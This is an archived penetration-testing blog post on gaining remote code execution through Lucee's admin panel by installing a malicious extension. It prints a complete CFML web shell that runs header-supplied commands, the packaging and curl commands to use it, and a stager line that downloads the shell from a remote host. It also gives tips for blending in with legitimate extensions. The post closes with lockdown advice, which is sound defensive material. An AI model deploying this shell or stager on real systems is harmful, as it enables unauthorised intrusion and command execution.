---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-15_i-love-lucee-building-lucee-extensions-for-remote-code-execution.md
original_filename: 2024-03-15_i-love-lucee-building-lucee-extensions-for-remote-code-execution.md
title: 'I Love Lucee: Building Lucee Extensions for Remote Code Execution'
category: documents
detected_topics:
- command-injection
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: dc1f196ca628ad24fa7163f1c06db075b2187bc5d34fd3ea9931e0bfda2e64c3
text_sha256: e3933622e4aec36d3467b50b0763585b04efbd796ca87c500d2d30625c62bac6
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: false
---

# I Love Lucee: Building Lucee Extensions for Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-15_i-love-lucee-building-lucee-extensions-for-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: False
- Raw SHA256: `dc1f196ca628ad24fa7163f1c06db075b2187bc5d34fd3ea9931e0bfda2e64c3`
- Text SHA256: `e3933622e4aec36d3467b50b0763585b04efbd796ca87c500d2d30625c62bac6`


## Content

---
title: "I Love Lucee: Building Lucee Extensions for Remote Code Execution"
page_title: "Sprocket Security | I Love Lucee: Building Extensions for Remote Code Execution"
url: "https://www.sprocketsecurity.com/resources/building-lucee-extensions-for-remote-code-execution"
final_url: "https://www.sprocketsecurity.com/blog/building-lucee-extensions-for-remote-code-execution"
authors: ["Will Vandevanter", "Juan Pablo Gomez Postigo"]
bugs: ["RCE"]
publication_date: "2024-03-15"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 380
---

![Settings icon](/img/svg/Icon Gear.svg) Resources Blog

# I Love Lucee: Building Lucee Extensions for Remote Code Execution

![Jp](https://assets.sprocketsecurity.com/uploads/Juan-Pablo-Gomez-Postigo-Author.png)

Juan Pablo Gomez Postigo

Senior Penetration Tester 

__ [ __](https://github.com/sprocket-security) [ __](https://www.youtube.com/@sprocketsecurity/)

[ Testing Lab](https://www.sprocketsecurity.com/blog/testing-lab) [ Technical](https://www.sprocketsecurity.com/blog/technical)

Mar 15, 2024 / 7 min read

![I Love Lucee: Building Lucee Extensions for Remote Code Execution](https://assets.sprocketsecurity.com/blog/Building-Lucee-Extensions-for-Remote-Code-Execution-feature.png)

**This blog was co-written by[ Will Vandevanter](https://www.linkedin.com/in/willis-vandevanter-82a05018/) and [JP Gomez](https://www.linkedin.com/in/juan-pablo-gomez-postigo-173a0b163/).**

During the past few assessments, Sprocket has encountered improperly configured instances of Lucee 5 and 4. In all cases, this led to remote code execution. Sometimes, the initial foothold has been either a default password (“connections”), a weak password, or, in the case of Lucee 4, a first-time setup page that allows a user to set the administrator password. Note that the Lucee administrator login uses a hardcoded username (i.e., no username guessing), has no password requirements, and no account lockout. This blog post will detail a straightforward method to execute remote code after acquiring administrative access to a Lucee login panel. Hopefully, this highlights the risk of improperly locking down the Lucee admin interface; at the bottom are important recommendations for locking down your Lucee instance.  

For those unfamiliar, Lucee is a popular platform for the Cold Fusion Markup Language (CFML). It is open source ([Lucee's website](https://lucee.org/learn.html)) and uses a dynamically typed scripting language running on the Java Virtual Machine (JVM). Lucee aims to simplify the development and deployment of web applications for developers working with Cold Fusion. Lucee has grown more popular in the past few years as a budget-friendly (i.e., free) alternative to the paid Adobe ColdFusion, especially because it can scale into cloud infrastructures without the burden of licensing fees.

## Lucee Extensions

Extensions offer additional functionality and admin commands in Lucee. They can be manually installed as a .lex package through the web portal. To manually install Lucee extensions, navigate to the "Applications" section under the "Extensions" menu on the left dashboard.

![](https://assets.sprocketsecurity.com/blog/Building-Lucee-Extensions-for-Remote-Code-Execution-1.png)

We will use a malicious Lucee extension to execute remote code through a web shell. The .lex package must be in a very specific format to be accepted by the admin portal and properly installed.  

_icon-info:_

Please note that Lucee 5 only accepts .lex files when installing extensions, while Lucee 4 also accepts .zip files. This blog post will focus on creating a .lex extension compatible with both versions.

![](https://assets.sprocketsecurity.com/blog/Building-Lucee-Extensions-for-Remote-Code-Execution-2.png)

## Building a .lex file

Lucee extensions follow a specific folder structure, which allows us to control where our web shell is dropped within the host device's file path. The full documentation on how to craft a Lucee extension can be found [here](https://docs.lucee.org/guides/lucee-5/extensions.html#lucee-5-extensions). Every Lucee extension must have a `/META-INF/`folder with a manifest file (`MANIFEST.MF`) inside. This file contains the following values:
  
  
  Manifest-Version: 1.0
  Built-Date: 2022-11-25 10:39:04
  version: "1.0.0.1"
  id: "FAD1E8CB-4444-4444-86359145767C29DE"
  name: "Totally Legit Lucee Extension"
  description: "Sprockt was here."
  release-type: web
  

Obviously, change these values for your use case. The only fields required in this file are the Manifest-Version, ID, version, and name. Everything else can be specified to blend in, though manually installed plugins will appear differently on the dashboard regardless, which will easily tip your hand to nosy defenders.

Next, we need a `logo.png` file in the root directory of the lex extension. We recommend grabbing an existing Lucee extension image. Finally, we can create the web shell itself. Since this will be a public web shell, we have added an authentication code to prevent unauthorized (well, other unauthorized users) from accessing the web shell and issuing commands. When a request is made, this code is passed in via the “X-Auth-Code” header. If a request is made without the proper auth code header, it will return a 404 error.
  
  
  <cfsetting showdebugoutput="no">
  <cfset secretCode = "ANYRANDOMSTRING" /> <!--- Set this to something unique like a randomly generated SHA1 Hash --->
  <cfset QuoteMark = "'" />
  <cfset DoubleQuoteMark = """" />
  
  <!--- Authentication: Check for the GUID in either a custom header or POSTed by the form --->
  <cfset suppliedCode = "" />
  <cfif structKeyExists(GetHttpRequestData().headers, "X-Auth-Code")>
  <cfset suppliedCode = "#StructFind(GetHttpRequestData().headers, "X-Auth-Code")#" />
  <cfelseif structKeyExists(FORM, "authCode")>
  <cfset suppliedCode = "#StructFind(FORM, "authCode")#" />
  </cfif>
  
  <cfif ( #suppliedCode# neq secretCode )>
  <cfheader statuscode="404" statustext="Page Not Found" />
  <cfabort />
  </cfif>
  

Next, we can pass commands using the “X-Command” header. This utilizes “cfexecute” in order to run commands on the host device through the terminal. The results are then returned when the web shell is called.
  
  
  <cfset command = "#StructFind(GetHttpRequestData().headers, "X-Command")#" />
  
  <cfexecute name="#command#" timeout="5" variable="foo"></cfexecute>
  <cfoutput>Result:</cfoutput>
  <cfoutput>#foo#</cfoutput>
  </cfsetting>
  

We can call this file “cmd.cfm” or any other unique filename. This file will be placed in a “context” folder which will determine where it gets installed once the .lex file is uploaded. In Lucee, context files are made available via a GET request to the `/lucee` directory. Note that if an extension is installed with the release type “server,” the web shell will be in the `/lucee-server` directory. So once everything is written, your folder structure should look like this:

![](https://assets.sprocketsecurity.com/blog/Building-Lucee-Extensions-for-Remote-Code-Execution-3.png)

This can then be packaged as a .lex file using the command below in the root directory containing all necessary files.
  
  
  jp@sprocket ~/lucee-webshell > zip sprocket.lex -r . 
  

## Using the web shell

Once the .lex file is built out, you can upload it via the web portal. If everything checks out, you’ll receive the following message indicating the upload was successful:

![](https://assets.sprocketsecurity.com/blog/Building-Lucee-Extensions-for-Remote-Code-Execution-4.png)

Now you can interact with the web shell simply using a command similar to the one below.
  
  
  curl -H "X-Auth-Code: Secret-Auth-Code" -H "X-Command: id" "<http://10.10.0.40:8888/lucee/cmd.cfm>" 
  

Here, we are executing the command `id` against a Linux device running Lucee. The results then get returned in the response.

![](https://assets.sprocketsecurity.com/blog/Building-Lucee-Extensions-for-Remote-Code-Execution-5.png)

Once again, we have a similar command, this time running `whoami` on a Windows server hosting Lucee.

![](https://assets.sprocketsecurity.com/blog/Building-Lucee-Extensions-for-Remote-Code-Execution-6.png)

Sometimes, a Lucee instance may be in front of a WAF, or directly uploading the cfm shell isn’t possible. If that is the case, one solution is to remove the cmd.cfm file in the extension and replace it with a simple stager. For example, add the following line to instead download the cmd.cfm through the extension. Note you will need to identify the Lucee webroot (i.e. path) from the admin panel:
  
  
  <cfhttp method='get' url='http://[remote-stager-ip]/cmd.cfm' path='/root/app/src/WEB-INF/lucee/context/' file='cmd.cfm'>
  

**GitHub Repository**

We also posted a GitHub repository to simplify the creation of malicious extensions. It follows the steps in the blog post but automates many components. The repository includes some notes on setting up Lucee 5 and 4 instances in Docker, providing a practical resource for developers and researchers interested in security testing.  

[![card-image](https://assets.sprocketsecurity.com/blog/BuffaloWill-Lucee-webshells.png)](https://github.com/BuffaloWill/lucee-webshells)

[BuffaloWill / lucee-webshells](https://github.com/BuffaloWill/lucee-webshells)

A tool for building Lucee extensions including remote code execution. This repository includes a python script to generate a Lucee extension that will add a webshell for remote code execution.

_icon-github:_ <https://github.com/BuffaloWill/lucee-webshells>

[](https://github.com/BuffaloWill/lucee-webshells)  

**Lockdown Recommendations**

Overall, Sprocket recommends the following to its customers and readers to secure existing Lucee installations.

  * Restrict Access to the Lucee Administrator page and other administrative directories. The Official Lucee lockdown guide lists which folders to block and includes a sample htaccess file. <https://docs.lucee.org/guides/deploying-lucee-server-apps/securing-lucee-server-apps/lucee-lockdown-guide.html>.
  * Disable the Lucee Administrator by setting LUCEE_ADMIN_ENABLED to false.
  * Set a complex password. Because no username is required and we could find no account lockout configuration feature in Lucee 5, a complex password is your only protection.
  * Make sure to keep your Lucee instance up to date. Within the past month, vulnerabilities have been released in Lucee that impact all versions and, under certain circumstances, result in remote code execution.
  * Enable a CAPTCHA or set a large delay on login attempts to hamper automated brute forcing. The example configuration page from Security > Password on Lucee 5 is given below:

![](https://assets.sprocketsecurity.com/blog/Building-Lucee-Extensions-for-Remote-Code-Execution-7.png)

Here at Sprocket, our mission is to continuously validate your security posture using a hybrid approach of automation and expert penetration testing across your attack surface year-round. We do this through [](https://www.sprocketsecurity.com/solutions/continuous-penetration-testing-old)[Continuous Penetration Testing](https://www.sprocketsecurity.com/solutions/continuous-penetration-testing-old). If your company uses Lucee in your tech stack, our testers can test against it for common and current exploits. Request [your personalized quote](https://www.sprocketsecurity.com/quote) today.

****This blog was co-written by[ Will Vandevanter](https://www.linkedin.com/in/willis-vandevanter-82a05018/) and [JP Gomez](https://www.linkedin.com/in/juan-pablo-gomez-postigo-173a0b163/).****

### Subscribe to our newsletter

Stay up-to-date on the latest exploits and industry news.

![Jp](https://assets.sprocketsecurity.com/uploads/Juan-Pablo-Gomez-Postigo-Author.png)

####  [ Juan Pablo Gomez Postigo ](https://www.sprocketsecurity.com/blog/authors/juan-pablo-gomez-postigo)

Senior Penetration Tester 

Juan Pablo (JP) is a passionate penetration tester out of Milwaukee WI. As a graduate from Marquette University with a degree in BioComputer Engineering, JP has been immersed in the world of cybersecurity and is also a member of the Season IV US Cyber Team. When he's not breaking things, JP enjoys running, rock climbing, and 3D printing in his workshop.

[ ![300x600 display add 1](https://assets.sprocketsecurity.com/blog/300x600_display-add-1.png) ](https://hubs.la/Q03c7zrB0)
